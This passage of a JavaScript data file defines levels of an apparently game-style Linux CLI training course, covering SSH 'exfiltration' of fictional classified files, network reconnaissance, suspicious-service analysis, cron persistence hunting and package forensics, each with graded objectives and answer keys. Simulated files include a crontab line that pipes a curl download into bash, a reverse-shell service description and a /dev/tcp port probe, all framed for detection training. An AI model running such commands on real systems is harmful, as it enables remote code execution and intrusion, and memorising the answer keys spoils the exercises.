                correctAnswerMessage: "BACKDOOR ACCOUNT IDENTIFIED. Recommend immediate disablement."
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-021: SSH Operations
        // Theme: Secure tunnel establishment for exfiltration
        // ──────────────────────────────────────────────────────────
        'CLH-021': {
            title: 'SSH Operations',
            description: 'Establish encrypted tunnels for secure intel exfiltration.',
            prerequisites: ['CLH-020'],
            tier: 'CLI Specter',
            user: 'operator',
            hostname: 'SAFEHOUSE',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                '/home/operator': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
                    children: ['.ssh', 'mission_brief.txt', 'UMBRA_intercepts.tar.gz', 'staging', '.bash_history', '.ssh_cheatsheet']
                },
                '/home/operator/.bash_history': {
                    type: 'file', perms: '-rw-------', owner: 'operator', group: 'operator', size: 312,
                    content: `ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519
ls -la ~/.ssh/
cat ~/.ssh/config
ssh -T relay
scp file.tar.gz user@host:/path/
ssh -L 8080:localhost:80 relay`
                },
                '/home/operator/.ssh_cheatsheet': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 945,
                    content: `╔═══════════════════════════════════════════════════════════════╗
║          SSH OPERATIONS CHEATSHEET                            ║
╚═══════════════════════════════════════════════════════════════╝

KEY GENERATION
─────────────
ssh-keygen -t ed25519           Generate Ed25519 key (recommended)
ssh-keygen -t rsa -b 4096       Generate RSA 4096-bit key
ssh-keygen -f ~/.ssh/mykey      Specify key filename
ssh-keygen -p -f keyfile        Change passphrase

KEY MANAGEMENT
─────────────
ls -la ~/.ssh/                  List SSH directory
cat ~/.ssh/id_ed25519.pub       View public key
chmod 600 ~/.ssh/id_*           Fix key permissions
ssh-copy-id user@host           Deploy public key

CONNECTION
─────────
ssh user@host                   Basic connection
ssh -i keyfile user@host        Specify identity file
ssh -p 2222 user@host           Non-standard port
ssh -T host                     Test connection (no TTY)

FILE TRANSFER
────────────
scp file user@host:/path/       Copy to remote
scp user@host:/path/file .      Copy from remote
scp -r dir/ user@host:/path/    Recursive copy
rsync -avz dir/ user@host:/p/   Sync with progress

TUNNELING
────────
ssh -L 8080:localhost:80 host   Local port forward
ssh -R 8080:localhost:80 host   Remote port forward
ssh -D 1080 host                SOCKS proxy`
                },
                '/home/operator/.ssh': {
                    type: 'dir', perms: 'drwx------', owner: 'operator', group: 'operator',
                    children: ['known_hosts', 'config', 'authorized_keys']
                },
                '/home/operator/.ssh/known_hosts': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 256,
                    content: 'relay.langley.gov ssh-ed25519 AAAAC3NzaC1lZDI1NTE5...[VERIFIED]\nbackup.langley.gov ssh-ed25519 AAAAC3NzaC1lZDI1NTE5...[VERIFIED]'
                },
                '/home/operator/.ssh/config': {
                    type: 'file', perms: '-rw-------', owner: 'operator', group: 'operator', size: 256,
                    content: `# SSH Configuration for OPERATION SILENT RELAY
Host relay
    HostName relay.langley.gov
    User handler
    IdentityFile ~/.ssh/id_ed25519
    Port 22

Host backup
    HostName backup.langley.gov
    User handler
    IdentityFile ~/.ssh/id_ed25519`
                },
                '/home/operator/.ssh/authorized_keys': {
                    type: 'file', perms: '-rw-------', owner: 'operator', group: 'operator', size: 178,
                    content: '# Handler public keys\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5... handler@langley'
                },
                '/home/operator/mission_brief.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 678,
                    content: `OPERATION SILENT RELAY
======================
Classification: TOP SECRET

Objective: Exfiltrate UMBRA intercepts via SSH tunnel

Handler: RAVEN-7 @ relay.langley.gov
Backup: RAVEN-7 @ backup.langley.gov

Protocol:
1. Generate Ed25519 key pair
2. Verify key in .ssh directory
3. Review SSH config for relay host
4. Test connection to relay
5. Secure copy package to handler

CODENAME: SILENT RELAY
STATUS: ACTIVE`
                },
                '/home/operator/UMBRA_intercepts.tar.gz': {
                    type: 'file', perms: '-rw-------', owner: 'operator', group: 'operator', size: 2516582,
                    content: '[TOP SECRET//UMBRA//NOFORN - Signal intercepts]\nEncrypted package ready for exfiltration\nSHA256: a3b4c5d6e7f8...'
                },
                '/home/operator/staging': {
                    type: 'dir', perms: 'drwx------', owner: 'operator', group: 'operator',
                    children: ['manifest.txt', 'transfer_log.txt']
                },
                '/home/operator/staging/manifest.txt': {
                    type: 'file', perms: '-rw-------', owner: 'operator', group: 'operator', size: 234,
                    content: 'EXFIL MANIFEST\n==============\nPackage: UMBRA_intercepts.tar.gz\nSize: 2.5MB\nClassification: TOP SECRET//UMBRA//NOFORN\nDestination: relay.langley.gov'
                },
                '/home/operator/staging/transfer_log.txt': {
                    type: 'file', perms: '-rw-------', owner: 'operator', group: 'operator', size: 189,
                    content: 'TRANSFER LOG\n============\nPending transfers:\n- UMBRA_intercepts.tar.gz -> relay\n\nCompleted transfers:\n[none]'
                },
            },

            objectives: [
                { id: 1, task: 'GENERATE: SSH Key Pair', hint: '$ ssh-keygen -t ed25519',
                  check: (cmd, state, output) => cmd.includes('ssh-keygen') &&
                         output && (output.includes('Generating') || output.includes('created') || output.includes('id_ed25519')) },
                { id: 2, task: 'VERIFY: Key Created', hint: '$ ls -la ~/.ssh/',
                  check: (cmd, state, output) => cmd.includes('ls') && cmd.includes('.ssh') &&
                         output && (output.includes('id_') || output.includes('config') || output.includes('known_hosts')) },
                { id: 3, task: 'CHECK: SSH Config', hint: '$ cat ~/.ssh/config',
                  check: (cmd, state, output) => cmd.includes('cat') && cmd.includes('config') &&
                         output && (output.includes('Host') || output.includes('relay') || output.includes('HostName')) },
                { id: 4, task: 'TEST: Connection', hint: '$ ssh -T relay (simulated)',
                  check: (cmd, state, output) => cmd.includes('ssh') && !cmd.includes('keygen') &&
                         output && (output.includes('connected') || output.includes('relay') || output.includes('authenticated')) },
                { id: 5, task: 'PREPARE: Secure Transfer', hint: '$ scp UMBRA_intercepts.tar.gz handler@relay:',
                  check: (cmd, state, output) => (cmd.includes('scp') || cmd.includes('rsync')) &&
                         output && (output.includes('transfer') || output.includes('100%') || output.includes('UMBRA')) },
            ],

            insightPhase: {
                enabled: true,
                question: "What is the operation codename for this SSH exfiltration mission?",
                acceptedAnswers: ["silent relay", "SILENT RELAY", "operation silent relay"],
                hint: "Check the mission_brief.txt file for the operation codename.",
                hintAfterAttempts: 3,
                wrongAnswerMessage: "Operation codename not recognized. Review mission briefing.",
                correctAnswerMessage: "OPERATION SILENT RELAY CONFIRMED. Secure channel established."
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-022: Network Reconnaissance
        // Theme: Mapping network infrastructure
        // ──────────────────────────────────────────────────────────
        'CLH-022': {
            title: 'Network Reconnaissance',
            description: 'Map network infrastructure from a compromised outpost.',
            prerequisites: ['CLH-021'],
            tier: 'CLI Specter',
            user: 'recon',
            hostname: 'OUTPOST-7',
            startDir: '/home/recon',
            allowedCommands: null,

            filesystem: {
                '/home/recon': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'recon', group: 'recon',
                    children: ['scans', 'notes', 'tools', 'reports', '.bash_history', '.network_recon_cheatsheet']
                },
                '/home/recon/.bash_history': {
                    type: 'file', perms: '-rw-------', owner: 'recon', group: 'recon', size: 278,
                    content: `ip addr
ip route
ss -tuln
cat /etc/resolv.conf
ping -c 3 192.168.1.1
netstat -rn
traceroute 10.0.0.1`
                },
                '/home/recon/.network_recon_cheatsheet': {
                    type: 'file', perms: '-rw-r--r--', owner: 'recon', group: 'recon', size: 967,
                    content: `╔═══════════════════════════════════════════════════════════════╗
║          NETWORK RECONNAISSANCE CHEATSHEET                    ║
╚═══════════════════════════════════════════════════════════════╝

INTERFACE ENUMERATION
────────────────────
ip addr                     List all interfaces with IPs
ip link                     List interfaces (link layer)
ifconfig                    Legacy interface listing
hostname -I                 Quick IP listing

ROUTING
──────
ip route                    Show routing table
ip route get 8.8.8.8        Find route to specific host
netstat -rn                 Legacy routing table
route -n                    Alternative routing view

PORT SCANNING
────────────
ss -tuln                    TCP/UDP listening ports
ss -tulnp                   With process names (needs root)
netstat -tuln               Legacy port listing
lsof -i :80                 What's using port 80?

DNS CONFIGURATION
────────────────
cat /etc/resolv.conf        DNS servers
cat /etc/hosts              Local hostname mappings
nslookup hostname           DNS lookup
dig hostname                Detailed DNS query

CONNECTIVITY TESTING
───────────────────
ping -c 3 host              ICMP echo test
traceroute host             Path to destination
mtr host                    Combined ping/traceroute
curl -I http://host         HTTP connectivity

TARGET DISCOVERY (10.0.0.66)
───────────────────────────
Gateway: 10.0.0.1
DNS: 10.0.0.2
Target Server: 10.0.0.66 (HIGH VALUE)`
                },
                '/home/recon/scans': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'recon', group: 'recon',
                    children: ['initial_sweep.txt', 'port_scan.txt', 'service_enum.txt']
                },
                '/home/recon/scans/initial_sweep.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'recon', group: 'recon', size: 678,
                    content: `NETWORK SWEEP RESULTS
=====================
Date: 2024-01-15 02:00 UTC
Operator: recon

DISCOVERED NETWORKS
───────────────────
192.168.1.0/24 - Corporate LAN (user workstations)
10.0.0.0/8 - Internal Services (servers, databases)
172.16.0.0/16 - DMZ (web servers, mail)

HIGH VALUE TARGETS
─────────────────
10.0.0.66 - Database server (MySQL 3306)
10.0.0.88 - File server (SMB 445)
172.16.0.10 - Web server (HTTP 80, HTTPS 443)`
                },
                '/home/recon/scans/port_scan.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'recon', group: 'recon', size: 456,
                    content: `PORT SCAN RESULTS - 10.0.0.66
==============================
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
3306/tcp open  mysql
8080/tcp open  http-proxy

NOTES: Database server - primary exfil target`
                },
                '/home/recon/scans/service_enum.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'recon', group: 'recon', size: 345,
                    content: `SERVICE ENUMERATION
===================
SSH: OpenSSH 8.4
HTTP: Apache 2.4.41
MySQL: 5.7.32
OS: Ubuntu 20.04 LTS`
                },
                '/home/recon/notes': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'recon', group: 'recon',
                    children: ['targets.txt', 'mission.txt']
                },
                '/home/recon/notes/targets.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'recon', group: 'recon', size: 345,
                    content: `PRIORITY TARGETS
================
1. 10.0.0.66 - Database (contains user data)
2. 10.0.0.88 - File server (contains backups)
3. 172.16.0.10 - Web server (entry point)

CODENAME: OUTPOST-7
PRIMARY TARGET IP: 10.0.0.66`
                },
                '/home/recon/notes/mission.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'recon', group: 'recon', size: 289,
                    content: `MISSION: NETWORK MAPPING
========================
Objective: Map internal network from compromised outpost
Priority: Identify database server for data extraction
Report findings to handler before proceeding`
                },
                '/home/recon/tools': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'recon', group: 'recon',
                    children: ['scanner.sh', 'port_check.sh']
                },
                '/home/recon/tools/scanner.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'recon', group: 'recon', size: 234,
                    content: '#!/bin/bash\n# Network scanner\necho "=== INTERFACES ==="\nip addr\necho "=== ROUTES ==="\nip route\necho "=== LISTENING PORTS ==="\nss -tuln'
                },
                '/home/recon/tools/port_check.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'recon', group: 'recon', size: 178,
                    content: '#!/bin/bash\n# Quick port check\necho "Checking common ports on $1"\nfor port in 22 80 443 3306; do\n  timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "$port open"\ndone'
                },
                '/home/recon/reports': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'recon', group: 'recon',
                    children: ['template.txt']
                },
                '/home/recon/reports/template.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'recon', group: 'recon', size: 234,
                    content: 'NETWORK RECON REPORT\n====================\nDate: \nOperator: \nNetwork Ranges: \nKey Targets: \nRecommendations: \n'
                },
            },

            objectives: [
                { id: 1, task: 'CHECK: Network Interfaces', hint: '$ ip addr (or ifconfig)',
                  check: (cmd, state, output) => (cmd.includes('ip addr') || cmd.includes('ip a') || cmd.includes('ifconfig')) &&
                         output && (output.includes('inet') || output.includes('eth') || output.includes('lo')) },
                { id: 2, task: 'VIEW: Routing Table', hint: '$ ip route (or netstat -rn)',
                  check: (cmd, state, output) => (cmd.includes('route') || cmd.includes('netstat')) &&
                         output && (output.includes('default') || output.includes('Gateway') || output.includes('via')) },
                { id: 3, task: 'SCAN: Open Ports', hint: '$ ss -tuln (or netstat -tuln)',
                  check: (cmd, state, output) => (cmd.includes('ss') || (cmd.includes('netstat') && cmd.includes('-'))) &&
                         output && (output.includes('LISTEN') || output.includes('State') || output.includes(':22') || output.includes(':80')) },
                { id: 4, task: 'CHECK: DNS Config', hint: '$ cat /etc/resolv.conf',
                  check: (cmd, state, output) => cmd.includes('resolv') &&
                         output && (output.includes('nameserver') || output.includes('search') || output.includes('dns')) },
                { id: 5, task: 'TEST: Connectivity', hint: '$ ping -c 3 192.168.1.1',
                  check: (cmd, state, output) => (cmd.includes('ping') || cmd.includes('traceroute')) &&
                         output && (output.includes('bytes') || output.includes('icmp') || output.includes('ttl') || output.includes('hop')) },
            ],

            insightPhase: {
                enabled: true,
                question: "What is the IP address of the primary target (database server)?",
                acceptedAnswers: ["10.0.0.66", "10.0.0.66/32", "ip 10.0.0.66"],
                hint: "Check the targets.txt in the notes directory or the initial_sweep.txt scan results.",
                hintAfterAttempts: 3,
                wrongAnswerMessage: "Target IP not confirmed. Review scan results and target notes.",
                correctAnswerMessage: "TARGET 10.0.0.66 CONFIRMED. Database server identified for extraction."
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-023: Service Management
        // Theme: Analyzing services on compromised server
        // ──────────────────────────────────────────────────────────
        'CLH-023': {
            title: 'Service Management',
            description: 'Analyze running services on a compromised server.',
            prerequisites: ['CLH-022'],
            tier: 'CLI Wraith',
            user: 'analyst',
            hostname: 'COMPROMISED-SRV',
            startDir: '/home/analyst',
            allowedCommands: null,

            filesystem: {
                '/home/analyst': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
                    children: ['analysis', 'reports', 'scripts', '.bash_history', '.systemctl_cheatsheet']
                },
                '/home/analyst/.bash_history': {
                    type: 'file', perms: '-rw-------', owner: 'analyst', group: 'analyst', size: 312,
                    content: `systemctl list-units --type=service
systemctl status sshd
systemctl cat sshd
systemctl --failed
systemctl list-unit-files --state=enabled
journalctl -u sshd -n 50`
                },
                '/home/analyst/.systemctl_cheatsheet': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 945,
                    content: `╔═══════════════════════════════════════════════════════════════╗
║          SERVICE MANAGEMENT CHEATSHEET                        ║
╚═══════════════════════════════════════════════════════════════╝

SERVICE LISTING
──────────────
systemctl list-units --type=service    Running services
systemctl list-units --all             All units (including inactive)
systemctl list-unit-files              All installed unit files
systemctl list-unit-files --state=enabled  Enabled services

SERVICE STATUS
─────────────
systemctl status <service>      Detailed service status
systemctl is-active <service>   Check if running
systemctl is-enabled <service>  Check if enabled at boot
systemctl show <service>        All service properties

SERVICE CONFIGURATION
────────────────────
systemctl cat <service>         View unit file contents
systemctl edit <service>        Edit unit file (override)
systemctl daemon-reload         Reload after config changes

TROUBLESHOOTING
──────────────
systemctl --failed              List failed services
journalctl -u <service>         View service logs
journalctl -u <service> -f      Follow logs in real-time
journalctl -u <service> -n 50   Last 50 log entries

SUSPICIOUS SERVICE: xmrig.service
────────────────────────────────
Known cryptominer - check for unauthorized mining`
                },
                '/home/analyst/analysis': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
                    children: ['services.txt', 'suspicious.txt', 'baseline.txt']
                },
                '/home/analyst/analysis/services.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 567,
                    content: `RUNNING SERVICES INVENTORY
==========================
sshd.service - OpenSSH daemon (LEGITIMATE)
nginx.service - Web server (LEGITIMATE)
mysql.service - Database (LEGITIMATE)
cron.service - Task scheduler (LEGITIMATE)
xmrig.service - UNKNOWN (SUSPICIOUS)
reverse_shell.service - UNKNOWN (SUSPICIOUS)
beacon.timer - UNKNOWN (SUSPICIOUS)`
                },
                '/home/analyst/analysis/suspicious.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 456,
                    content: `SUSPICIOUS SERVICES DETECTED
============================
xmrig.service - Cryptominer (HIGH PRIORITY)
  - Consuming 95% CPU
  - Mining Monero cryptocurrency
  - Installed: 2024-01-10

reverse_shell.service - Backdoor (CRITICAL)
  - Connects to 10.0.0.88:4444
  - Provides remote shell access

beacon.timer - C2 heartbeat (HIGH)
  - Checks in every 5 minutes
  - Downloads commands from C2`
                },
                '/home/analyst/analysis/baseline.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 345,
                    content: `BASELINE SERVICES (Known Good)
==============================
sshd.service
nginx.service
mysql.service
cron.service
systemd-*
networking.service

Any service NOT on this list requires investigation.`
                },
                '/home/analyst/reports': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
                    children: ['template.txt', 'findings.txt']
                },
                '/home/analyst/reports/template.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 234,
                    content: 'SERVICE ANALYSIS REPORT\n=======================\nDate: \nAnalyst: \nTotal Services: \nSuspicious: \nRecommendations: \n'
                },
                '/home/analyst/reports/findings.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 289,
                    content: 'PRELIMINARY FINDINGS\n====================\n3 suspicious services identified\nRecommendation: Disable xmrig.service immediately\nEscalate reverse_shell.service to incident response'
                },
                '/home/analyst/scripts': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
                    children: ['audit_services.sh']
                },
                '/home/analyst/scripts/audit_services.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'analyst', group: 'analyst', size: 312,
                    content: '#!/bin/bash\necho "=== SERVICE AUDIT ==="\necho "Running services:"\nsystemctl list-units --type=service --state=running\necho "\\n=== Failed services:"\nsystemctl --failed'
                },
            },

            objectives: [
                { id: 1, task: 'LIST: Running Services', hint: '$ systemctl list-units --type=service',
                  check: (cmd, state, output) => cmd.includes('systemctl') && cmd.includes('list') &&
                         output && (output.includes('service') || output.includes('loaded') || output.includes('running')) },
                { id: 2, task: 'CHECK: Service Status', hint: '$ systemctl status sshd',
                  check: (cmd, state, output) => cmd.includes('systemctl') && cmd.includes('status') &&
                         output && (output.includes('Active') || output.includes('running') || output.includes('loaded')) },
                { id: 3, task: 'VIEW: Service Config', hint: '$ systemctl cat sshd',
                  check: (cmd, state, output) => cmd.includes('systemctl') && cmd.includes('cat') &&
                         output && (output.includes('[Unit]') || output.includes('[Service]') || output.includes('ExecStart')) },
                { id: 4, task: 'FIND: Failed Services', hint: '$ systemctl --failed',
                  check: (cmd, state, output) => cmd.includes('systemctl') && cmd.includes('failed') &&
                         output && (output.includes('failed') || output.includes('UNIT') || output.includes('0 loaded')) },
                { id: 5, task: 'LIST: Enabled Services', hint: '$ systemctl list-unit-files --state=enabled',
                  check: (cmd, state, output) => cmd.includes('systemctl') && cmd.includes('enabled') &&
                         output && (output.includes('enabled') || output.includes('unit files') || output.includes('.service')) },
            ],

            insightPhase: {
                enabled: true,
                question: "What is the name of the cryptominer service running on this server?",
                acceptedAnswers: ["xmrig", "xmrig.service", "xmrig service"],
                hint: "Check the suspicious.txt file in the analysis directory.",
                hintAfterAttempts: 3,
                wrongAnswerMessage: "Service not identified. Review the suspicious services analysis.",
                correctAnswerMessage: "XMRIG CRYPTOMINER CONFIRMED. Recommend immediate termination."
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-024: Scheduled Tasks (Cron)
        // Theme: Finding persistence mechanisms
        // ──────────────────────────────────────────────────────────
        'CLH-024': {
            title: 'Scheduled Tasks',
            description: 'Hunt for malicious cron jobs and persistence mechanisms.',
            prerequisites: ['CLH-023'],
            tier: 'CLI Wraith',
            user: 'operator',
            hostname: 'BEACON-NODE',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                '/home/operator': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
                    children: ['analysis', 'scripts', '.bash_history', '.cron_cheatsheet']
                },
                '/home/operator/.bash_history': {
                    type: 'file', perms: '-rw-------', owner: 'operator', group: 'operator', size: 289,
                    content: `crontab -l
cat /etc/crontab
ls -la /etc/cron.d/
find /etc/cron* -type f
cat /etc/cron.d/backdoor
grep -r "curl\\|wget\\|bash" /etc/cron*`
                },
                '/home/operator/.cron_cheatsheet': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 923,
                    content: `╔═══════════════════════════════════════════════════════════════╗
║          CRON & SCHEDULED TASKS CHEATSHEET                    ║
╚═══════════════════════════════════════════════════════════════╝

USER CRONTABS
────────────
crontab -l                  List current user's crontab
crontab -e                  Edit current user's crontab
crontab -l -u username      List another user's crontab (root)

SYSTEM CRON LOCATIONS
────────────────────
/etc/crontab                System crontab
/etc/cron.d/                Drop-in cron files
/etc/cron.hourly/           Hourly scripts
/etc/cron.daily/            Daily scripts
/etc/cron.weekly/           Weekly scripts
/etc/cron.monthly/          Monthly scripts
/var/spool/cron/crontabs/   User crontabs

CRON SYNTAX
──────────
* * * * * command
│ │ │ │ │
│ │ │ │ └── Day of week (0-7)
│ │ │ └──── Month (1-12)
│ │ └────── Day of month (1-31)
│ └──────── Hour (0-23)
└────────── Minute (0-59)

SUSPICIOUS INDICATORS
────────────────────
- curl/wget piped to bash
- Jobs running from /tmp or hidden dirs
- Base64 encoded commands
- Unusual frequency (*/1, */5)

MALICIOUS CRON: /etc/cron.d/backdoor
───────────────────────────────────
Runs persist.sh every 10 minutes`
                },
                '/home/operator/analysis': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
                    children: ['cron_audit.txt', 'suspicious_jobs.txt']
                },
                '/home/operator/analysis/cron_audit.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 456,
                    content: `CRON AUDIT RESULTS
==================
Date: 2024-01-15

SYSTEM CRONTAB: /etc/crontab
- Standard hourly/daily jobs (LEGITIMATE)

USER CRONTABS:
- root: 2 suspicious entries found
- operator: clean

/etc/cron.d/:
- e2scrub_all: LEGITIMATE
- popularity-contest: LEGITIMATE
- backdoor: MALICIOUS (investigate)`
                },
                '/home/operator/analysis/suspicious_jobs.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 567,
                    content: `SUSPICIOUS CRON JOBS
====================

1. /var/spool/cron/crontabs/root
   */5 * * * * /tmp/.hidden/beacon.sh
   >> Runs beacon every 5 minutes
   >> C2 communication suspected

2. /var/spool/cron/crontabs/root
   0 * * * * curl http://10.0.0.88/update | bash
   >> Downloads and executes code hourly
   >> CRITICAL: Remote code execution

3. /etc/cron.d/backdoor
   */10 * * * * root /opt/.malware/persist.sh
   >> Persistence mechanism
   >> Runs as root every 10 minutes`
                },
                '/home/operator/scripts': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
                    children: ['audit_cron.sh']
                },
                '/home/operator/scripts/audit_cron.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'operator', group: 'operator', size: 312,
                    content: '#!/bin/bash\necho "=== CRON AUDIT ==="\necho "System crontab:"\ncat /etc/crontab\necho "\\n=== Cron.d:"\nls -la /etc/cron.d/\necho "\\n=== User crontabs:"\nls -la /var/spool/cron/crontabs/'
                },
                '/var/spool/cron/crontabs': {
                    type: 'dir', perms: 'drwx-wx--T', owner: 'root', group: 'crontab',
                    children: ['root', 'operator']
                },
                '/var/spool/cron/crontabs/root': {
                    type: 'file', perms: '-rw-------', owner: 'root', group: 'crontab', size: 256,
                    content: '# Root crontab - COMPROMISED\n# Legitimate entries removed for brevity\n\n# MALICIOUS - C2 beacon\n*/5 * * * * /tmp/.hidden/beacon.sh\n\n# MALICIOUS - Remote code execution\n0 * * * * curl http://10.0.0.88/update | bash'
                },
                '/var/spool/cron/crontabs/operator': {
                    type: 'file', perms: '-rw-------', owner: 'operator', group: 'crontab', size: 89,
                    content: '# Operator crontab\n# No entries - clean'
                },
                '/etc/cron.d': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: ['e2scrub_all', 'popularity-contest', 'backdoor']
                },
                '/etc/cron.d/e2scrub_all': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 178,
                    content: '# Legitimate system maintenance\n30 3 * * 0 root test -e /run/systemd/system || /usr/sbin/e2scrub_all -A'
                },
                '/etc/cron.d/popularity-contest': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 156,
                    content: '# Ubuntu package popularity contest\nPATH=/usr/bin\n*/30 * * * * root /usr/sbin/popularity-contest'
                },
                '/etc/cron.d/backdoor': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 178,
                    content: '# MALICIOUS - Persistence mechanism\n# Added by attacker on 2024-01-10\n*/10 * * * * root /opt/.malware/persist.sh'
                },
                '/etc/crontab': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 512,
                    content: 'SHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# Standard system crontab entries\n17 * * * * root cd / && run-parts --report /etc/cron.hourly\n25 6 * * * root test -x /usr/sbin/anacron || run-parts --report /etc/cron.daily\n47 6 * * 7 root test -x /usr/sbin/anacron || run-parts --report /etc/cron.weekly'
                },
            },

            objectives: [
                { id: 1, task: 'LIST: User Crontab', hint: '$ crontab -l',
                  check: (cmd, state, output) => cmd.includes('crontab') && cmd.includes('-l') &&
                         output && (output.includes('no crontab') || output.includes('*') || output.includes('crontab')) },
                { id: 2, task: 'CHECK: System Crontab', hint: '$ cat /etc/crontab',
                  check: (cmd, state, output) => cmd.includes('cat') && cmd.includes('crontab') &&
                         output && (output.includes('SHELL') || output.includes('PATH') || output.includes('root')) },
                { id: 3, task: 'SEARCH: Cron Directories', hint: '$ ls -la /etc/cron.d/',
                  check: (cmd, state, output) => cmd.includes('ls') && cmd.includes('cron') &&
                         output && (output.includes('backdoor') || output.includes('cron') || output.includes('-rw')) },
                { id: 4, task: 'FIND: All Cron Jobs', hint: '$ find /etc/cron* -type f',
                  check: (cmd, state, output) => cmd.includes('find') && cmd.includes('cron') &&
                         output && (output.includes('/etc/cron') || output.includes('crontab') || output.includes('backdoor')) },
                { id: 5, task: 'ANALYZE: Suspicious Entry', hint: '$ cat /etc/cron.d/backdoor',
                  check: (cmd, state, output) => cmd.includes('cat') && cmd.includes('backdoor') &&
                         output && (output.includes('persist') || output.includes('MALICIOUS') || output.includes('*/10')) },
            ],

            insightPhase: {
                enabled: true,
                question: "How often (in minutes) does the backdoor cron job run?",
                acceptedAnswers: ["10", "10 minutes", "every 10 minutes", "*/10"],
                hint: "Check the /etc/cron.d/backdoor file for the cron schedule.",
                hintAfterAttempts: 3,
                wrongAnswerMessage: "Interval not confirmed. Review the backdoor cron entry.",
                correctAnswerMessage: "10-MINUTE INTERVAL CONFIRMED. Persistence mechanism identified."
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-025: Package Management
        // Theme: Forensic analysis of installed packages
        // ──────────────────────────────────────────────────────────
        'CLH-025': {
            title: 'Package Management',
            description: 'Analyze installed packages for unauthorized software.',
            prerequisites: ['CLH-024'],
            tier: 'CLI Wraith',
            user: 'analyst',
            hostname: 'FORENSIC-WS',
            startDir: '/home/analyst',
            allowedCommands: null,

            filesystem: {
                '/home/analyst': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
                    children: ['package_audit', 'reports', 'evidence', '.bashrc', '.bash_history', '.package_cheatsheet']
                },
                '/home/analyst/.bash_history': {
                    type: 'file', perms: '-rw-------', owner: 'analyst', group: 'analyst', size: 312,
                    content: `dpkg -l | head -20
dpkg -l | grep -i ssh
dpkg -s openssh-server
grep " install " /var/log/dpkg.log
dpkg -V openssh-server
apt list --installed 2>/dev/null | wc -l
dpkg --get-selections | grep -v deinstall`
                },
                '/home/analyst/.package_cheatsheet': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 1536,
                    content: `╔═══════════════════════════════════════════════════════════════╗
║              PACKAGE MANAGEMENT CHEATSHEET                    ║
╠═══════════════════════════════════════════════════════════════╣
║ LIST PACKAGES:                                                ║
║   dpkg -l                    # All installed (deb format)     ║
║   dpkg -l | grep ^ii         # Only installed packages        ║
║   apt list --installed       # APT format listing             ║
║   dpkg --get-selections      # Selection states               ║
║                                                               ║
║ SEARCH PACKAGES:                                              ║
║   dpkg -l | grep <pattern>   # Search by name                 ║
║   dpkg -S /path/to/file      # Find owning package            ║
║   apt-cache search <term>    # Search available packages      ║
║                                                               ║
║ PACKAGE INFO:                                                 ║
║   dpkg -s <package>          # Package status/details         ║
║   dpkg -L <package>          # List files in package          ║
║   apt-cache show <package>   # Full package information       ║
║                                                               ║
║ INSTALLATION LOGS:                                            ║
║   /var/log/dpkg.log          # Package manager log            ║
